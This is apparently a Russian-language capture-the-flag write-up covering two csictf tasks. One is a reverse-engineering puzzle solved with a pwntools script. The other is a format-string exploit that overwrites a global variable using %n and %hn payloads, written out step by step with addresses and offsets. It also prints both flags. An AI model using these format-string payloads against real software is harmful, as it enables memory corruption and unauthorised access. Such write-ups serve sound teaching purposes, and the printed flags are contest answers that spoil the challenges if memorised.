# 1. RickNMorty

## Description

Rick has been captured by the council of Rick's and in this dimension Morty has to save him, the chamber holding Rick needs a key. Can you help him find the key?

```
nc chall.csivit.com 30827
```

## Анализ

МЫ ОБЯЗАНЫ СПАСТИ РИКА!

Что случится, если мы запустим бинарник локально?

```
kali@kali:~/Downloads$ ./RickNMorty
7 9
3
15 15
3
12 15
3
15 9
3
12 14
3
8 7
1
fun() took 7.000000 seconds to execute
Nahh.
```

Нам выводится набор пар чисел и мы должны давать правильный ввод в ответ на каждую пару.

Декомпилируем с помощью Гидры и посмотрим на функцию `main()`:

```c
undefined8 main(void)
{
  int iVar1;
  time_t tVar2;
  long lVar3;
  long local_48;
  time_t local_40;
  time_t local_38;
  time_t local_30;
  long local_28;
  long local_20;
  char *local_18;
  int local_10;
  int local_c;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  tVar2 = time(&local_30);
  srand((uint)tVar2);
  time(&local_38);
  local_c = 1;
  local_10 = 0;
  while( true ) {
    iVar1 = rand();
    if (iVar1 % 3 + 4 < local_10) break;
    iVar1 = rand();
    local_20 = (long)(iVar1 % 10 + 6);
    iVar1 = rand();
    local_28 = (long)(iVar1 % 10 + 6);
    printf("%d %d\n",local_20,local_28);
    __isoc99_scanf(&DAT_0040200f,&local_48);
    lVar3 = function1(local_20);
    lVar3 = function2(lVar3 + 3);
    if (lVar3 != local_48) {
      local_c = 0;
    }
    local_10 = local_10 + 1;
  }
  time(&local_40);
  local_18 = (char *)(double)(local_40 - local_38);
  printf(local_18,"fun() took %f seconds to execute \n");
  if ((local_c != 1) || (30.00000000 < (double)local_18)) {
    printf("Nahh.");
  }
  else {
    puts("Hey, you got me!");
    system("cat flag.txt");
  }
  return 0;
}
```

Этот цикл просто генерит рандомную пару чисел и пропускает их через функции `function1()` и `function2()`, а затем сравнивает ввод с ответом. все ответы должны быть правильными, чтобы получить флаг.

`function1()` и `function2()` довольно простые:

```c
long function1(long param_1,long param_2)
{
  int local_10;
  int local_c;
  
  local_c = 0;
  local_10 = 1;
  while ((local_10 <= param_1 || (local_10 <= param_2))) {
    if ((param_1 % (long)local_10 == 0) && (param_2 % (long)local_10 == 0)) {
      local_c = local_10;
    }
    local_10 = local_10 + 1;
  }
  return (long)local_c;
}
```

```c
long function2(long param_1)
{
  long lVar1;
  
  if (param_1 == 0) {
    lVar1 = 1;
  }
  else {
    lVar1 = function2(param_1 + -1);
    lVar1 = lVar1 * param_1;
  }
  return lVar1;
}
```

Нам даже не надо знать, что в действительности делают эти функции - просто скопируем все математические операции и подставим получившиеся значения во ввод.

## Решение

Быстро накидаем питоновский скриптик, решающий задачу. Для этого скопируем математическую часть функций, затем, с помощью модуля pwntools считаем выданные сервероом числа, прогоним их через `fun1()` и `fun2()`, и отправим получившийся ответ серверу.

```python
#!/usr/bin/env python3
from pwn import *

context.log_level='DEBUG'
#p = process('./RickNMorty')
p = remote('chall.csivit.com', 30827)

def fun1(param_1, param_2):
    local_c = 0
    local_10 = 1
    while (local_10 <= param_1) or (local_10 <= param_2):
        if (param_1 % local_10 == 0) and (param_2 % local_10 == 0):
            local_c = local_10
        local_10 += 1
    return local_c

def fun2(param_1):
    lvar1 = 0
    if param_1 == 0:
        lvar1 = 1
    else:
        lvar1 = fun2(param_1 - 1)
        lvar1 = lvar1 * param_1
    return lvar1

while True:
    line = p.recvline()
    if not line or line.decode().startswith('fun() took'):
        break

    nums = line.decode().rstrip().split(' ')
    ans = fun1(int(nums[0]), int(nums[1]))
    ans = fun2(ans + 3)
    p.sendline(str(ans))

p.stream()
```

Получим правильные ответы и захватим флаг):

```
kali@kali:~/Downloads$ ./ricknmorty.py 
[DEBUG] PLT 0x40102c puts
[DEBUG] PLT 0x401040 setbuf
[DEBUG] PLT 0x401050 system
[DEBUG] PLT 0x401060 printf
[DEBUG] PLT 0x401070 srand
[DEBUG] PLT 0x401080 time
[DEBUG] PLT 0x401090 __isoc99_scanf
[DEBUG] PLT 0x4010a0 rand
[*] '/home/kali/Downloads/RickNMorty'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chall.csivit.com on port 30827: Done
[DEBUG] Received 0x6 bytes:
    b'11 15\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Received 0x5 bytes:
    b'9 12\n'
[DEBUG] Sent 0x4 bytes:
    b'720\n'
[DEBUG] Received 0x5 bytes:
    b'7 10\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Received 0x5 bytes:
    b'9 11\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Received 0x5 bytes:
    b'8 10\n'
[DEBUG] Sent 0x4 bytes:
    b'120\n'
[DEBUG] Received 0x5 bytes:
    b'6 13\n'
[DEBUG] Sent 0x3 bytes:
    b'24\n'
[DEBUG] Received 0x28 bytes:
    b'fun() took 0.000000 seconds to execute \n'
[DEBUG] Received 0x11 bytes:
    b'Hey, you got me!\n'
Hey, you got me!
[DEBUG] Received 0x28 bytes:
    b'csictf{h3_7u2n3d_h1m531f_1n70_4_p1ck13}\n'
csictf{h3_7u2n3d_h1m531f_1n70_4_p1ck13}
```

Флаг:

```
csictf{h3_7u2n3d_h1m531f_1n70_4_p1ck13}
```

(Да, он превратил себя в ОГУРЧИК РИИИИИИК)

# 2. Global Warming - Pwn #4

Этот таск отнял у меня много времени, но также многому научил. Для начала загрузим файл.

```
$ file global-warming
global-warming: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a8349c997968a84bfa8b253e0f9a3f9349cc1538, for GNU/Linux 3.2.0, not stripped
```

Из вывода можно видеть, что бинарь 32-битный. Что ж, запустим его.

```
$ chmod +x global-warming
$ ./global-warming
hello?
hello?
You cannot login as admin.
```

Оч интересно. Программа выводит всё, что я напишу. А знаете, что это значит? Что перед нами, скорее всего, уязвимость форматной строки. Но рано радоваться, давайте-ка проверим нашу теорию с помощью Ghidra. После небольшого форматирования кода декомпилятора у нас получится две функции (`main` и `login`) и глобальная переменная `admin`.

```
int admin;

void
login(char *buf)
{
  printf(buf);  // мы не ошиблись! вот она, вот она, уяяяяяязь!
  if (admin == 0xb4dbabe3) {
    system("cat flag.txt");
  } else {
    printf("You cannot login as admin.");
  }
  return;
}

int
main(void) {
  char buf[1024];
  fgets(buf, 0x400, stdin);
  login(buf);
  return 0;
}
```

Вот на этом моменте я прифигел. Что? Как мне изменить глобалку через форматную строку?? Тут даже переполнения буфера нет. Я никогда с этим не встречался! И на этой тревожной ноте, как и любой цтф-одепт, я пошел гуглить. 

`*** four hours later ***`

Выяснилось, что если нам в руки попала уязвимость форматной строки, мы можем читать любую читаемую область программы, а не только стек под нами. Круто, а?

Пройдем по порядку. У нас под контролем строка, в которую мы можем записывать различные спецификаторы вроде `%x`, `%p`, `%n` и т.д. Для начала поймём, где на стеке лежит то, что мы собираемся напечатать. Мы помним, чтобы прочесть 1 ячейку стека, нам требуется передать в `printf` одну `%x`. Передадим 12.

```
$ python -c 'print "AAAA." + "%x."*12' | ./chall
AAAA.f7f29ad4.fbad2087.80491b2.f7eed000.804c000.fff29af8.8049297.804a030.fff296f0.f7eed580.8049219.41414141
You cannot login as admin.
````

Как удачно попали. Нам нужно 12 `%x`. Если забыли, `0x41` - это ASCII-код для `'A'`. Отлично, с этим разобрались. Теперь покажу, как можно прочесть любой участок памяти. Всё что вам нужно знать - адрес этой памяти. Давайте глянем адрес `admin` в gdb.

```
gef➤  hexdump &admin
0x0804c02c <admin+0000>     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x0804c03c                  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x0804c04c                  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x0804c05c                  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
```

Нужный нам адрес - `0x0804c02c`. Давайте его прочитаем. Всё, что вам нужно вспомнить, чтобы догадаться, как я это сделаю - то, как работает `printf` в нормальных условиях:

```
printf("hey %d I %x can %p spam %u some %s values!", int1, hex2, pointer3, unsigned4, string5);
```

Здесь, для того, чтобы напечатать строку он возьмет 5 ячеек из аргументов printf (помните, как устроены стек-фреймы, правда?). Эти ячейки расположены сразу за `return-address`. А теперь давайте обманем этот механизм, подав бинарю `\x2c\xc0\x04\x08.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%p`:

```
printf("\x2c\xc0\x04\x08.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%p"); // вот так это будет выглядеть

$ python -c 'print "\x2c\xc0\x04\x08." + "%x."*11 + "%s"' | ./chall
,.f7f03ad4.fbad2087.80491b2.f7ec7000.804c000.fface8a8.8049297.804a030.fface4a0.f7ec7580.8049219.
You cannot login as admin.
```

Обратите внимание, что подал я 11 `%x` и 1 `%s`. Хексовых значений вывелось 11. А куда же делась строка? А я скажу вам. Она там есть. Просто мы прочитали что-то по адресу глобальной переменной `admin`! Почему ничего не вывелось? Да потому что там нулевые байты! Как можно вывести нулевую строку-то? Никак. Что и следовало ожидать.

Итак, мы научились читать произвольную область памяти. Это хорошо. Но как же мы будем в неё писать? Есть идея. У `printf` есть специальный спецификатор ввода `%n`. Если где-то указан `%n`, то по адресу, указанному в соответствующем аргументе будет записано целое число - длина строки до этого спецификатора. Например:

```
int len;
printf("In my childhood %n I was a legit Half-Life Deathmatch player!\n", &len); // => len = 16
```

Уловили? В качестве адреса этой переменной мы передадим адрес глобальной! Как-то так:

```
printf("\x2c\xc0\x04\x08.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n");
вывод в нашем случае:
,.f7fe7ad4.fbad2087.80491b2.f7fab000.804c000.ffffcfd8.8049297.804a030.ffffcbd0.f7fab580.8049219.
```

Этот пример запишет в `admin` число `0x63`! А `0х63` - это ASCII-код буквы `'c'`. Если я прав, мы должны увидеть её, прочитав. Чтобы одновременно и записать, и прочитать, воспользуемся `%12$s`. Спецификатор `%12$s` говорит `printf` вывести строку, указанную по адресу в 12-м аргументе.
```
python -c 'print "\x2c\xc0\x04\x08." + "%x."*11 + "%n" + "%12$s"' | ./chall
,.f7f42ad4.fbad2087.80491b2.f7f06000.804c000.ffc67088.8049297.804a030.ffc66c80.f7f06580.8049219.c
You cannot login as admin.
```

`c`!!! Мы записали в admin число `0x63`! Теперь самое странное. Как же нам записать в `admin` число `0xb4dbabe3`? Этож пипец как много подавать на вход программе придётся, подумал я. А нет, нифига. Можно подать спецификатор типа `%123x`. В этом случае сколько бы не вывел обычный `%x`, спецификатор дополнит вывод до длины 123. Т.е. всю грязную работу повесим на бинарь, поняли план? `0xb4dbabe3 = 3034295267`.

```
python -c 'print "\x2c\xc0\x04\x08." + "%x."*10 + "%3034295267x" + "%n"' | ./chall
```

Запускаем и оставляем ноут на пару дней, потому что бинарь будет выводить все эти дополняющие пробелы на экран...? Вы готовы увидеть пробелов больше, чем `MAX_INT`? Я нет. Поэтому я в это время пошел искать способ уменьшить количество времени. И нашел. Что, если мы запишем не 4-байтовое число, а два числа по 2 байта? Звучит как неплохая идея. На этот случай есть спецификатор `%hn`, позволяющий писать в память короткие двух-байтовые слова. Штош, затестим. Сначала пишем младшую `0xabe3 = 44003`, а потом пишем старшую `0xb4db = 46299` (только для записи нужно вычесть из числа `44003`, так как второй `%hn` считает всю длину до своего появления). Попробуем? Надо не забыть - в этот раз добавляем два адреса - `admin` для младшей и `admin+2` для старшей части `0xb4dbabe3`.

```
python -c 'print "\x2c\xc0\x04\x08\x2e\xc0\x04\x08" + "%x."*11 + "%44003x" + "%12$hn" + "%2296x" + "%13$hn"' | ./chall
<многапробелов>
You cannot login as admin.
```

Штош токое! Почему? А, мы забыли отнять `0x66` из `44003`. Почему `0x66`, было жеж `0x63`!!! - скажете вы, если еще со мной. А потому что мы напечатали еще второй адрес, а там целых два печатных символа + я точку проебал при копировании => потеряли 3 байта => длина нашего начального мусора изменилась. Прибавить надо. Отнимем и получим `43901`. Итак, ПЛИ!

```
python -c 'print "\x2c\xc0\x04\x08\x2e\xc0\x04\x08" + "%x."*11 + "%43901x" + "%12$hn" + "%2296x" + "%13$hn"' | ./chall
<многапробелов>
csictf{n0_5tr1ng5_@tt@ch3d}
```

**BINARY IS DEAD. PRESS F TO PAY RESPECT.**

